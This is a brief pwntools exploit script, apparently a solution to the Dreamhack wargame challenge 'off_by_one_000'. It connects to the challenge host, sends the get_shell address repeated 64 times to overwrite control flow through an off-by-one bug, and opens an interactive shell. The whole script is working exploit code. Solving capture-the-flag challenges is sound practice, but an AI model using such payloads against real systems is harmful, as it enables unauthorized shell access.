#!/usr/bin/python3
from pwn import *
context.binary = exe= ELF('./off_by_one_000',checksec=False)
#p = process()
p = remote('host3.dreamhack.games', 16404)
#gdb.attach(p,gdbscript='''
#           b*0x08048691
#           b*0x08048661
#           ''')
get = exe.sym.get_shell
payload = p32(get)*64


input()
p.sendline(payload)
p.interactive()
